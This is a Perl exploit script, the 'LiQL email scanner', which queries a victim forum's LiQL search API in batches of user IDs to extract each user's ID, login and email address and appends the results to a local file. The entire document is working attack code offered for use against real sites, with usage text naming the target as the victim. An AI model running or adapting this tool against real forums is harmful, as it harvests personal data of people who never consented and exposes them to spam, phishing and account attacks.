#!/usr/bin/perl
use Encode qw(encode_utf8);
use LWP;
use HTTP::Request;
use JSON qw( decode_json );
if(@ARGV != 4) { usage(); }
else { scanit(); }
sub header()
{
  print "\n- LiQL email scanner\r\n";
}
sub usage()
{
  header();
  print "- Usage: $0 <host> <path> <maxuserid>\r\n";
  print "- <host> -> Victim's host e.g : https://forums.victim.com\r\n";
  print "- <path> -> Victim's LiQL path e.g lithosphere\r\n";
  print "- <startuserid> -> Start of UserID will be scanned on victim e.g: 0\r\n";
  print "- <maxuserid> -> Max UserID will be scanned on victim e.g: 10000\r\n";
  print "- This tool will scan from UserID: <startuserid> to <maxuserid> and filter their emails\r\n";
  exit();
}
sub scanit ()
{
  #Our variables...
  header();
  $p_userid = $ARGV[2];
  requery:
  my $p_address = 'http://'.$ARGV[0].'/'.$ARGV[1].'/api/2.0/search?q=';
  my $p_query = 'SELECT+id,email,login+FROM+users+where+id+in+(';
  $i = 0;
  for (;$i<100;$i++) {
    $p_userid++;
    if ($i != 99) {
      $p_query=$p_query.'"'.$p_userid.'",';
    }
    else {
      $p_query=$p_query.'"'.$p_userid.'")+LIMIT+100';
    }
  }
  print "- Current query: $p_query\r\n";
  $p_address .= $p_query;
  my $p_useragent = LWP::UserAgent->new;
  $p_useragent->timeout(10);
  $p_useragent->agent('Mozilla/5.0');
  $p_useragent->cookie_jar({});
  my $p_header = ['Accept' => 'application/json','Content-type' => 'application/json; charset=utf-8','Accept-Language' => 'tr,en-GB;q=0.8,en;q=0.5,pl;q=0.3','Accept-Encoding' => 'gzip, deflate, br','Cache-Control' => 'no-cache'];
  my $p_request = HTTP::Request->new(GET,$p_address,$p_header,$p_content);
  my $p_response = $p_useragent->request($p_request);
  if ($p_response->is_success) {
    $answer = $p_response->decoded_content;
    $json_data = decode_json($answer);
    my @data = @{ $json_data->{'data'}->{'items'} };
    foreach my $d ( @data ) {
      if ($d->{'email'} =~ m/@/) {
       $result = "- email found for id $d->{'id'}, login: $d->{'login'}: $d->{'email'}\r\n";
       open(OUTPUT, ">>found.txt");
       print OUTPUT $result;
       close(OUTPUT);
       print $result;
     }
    }
    if ($p_userid < $ARGV[3]) {
      goto requery;
    }
  }
}

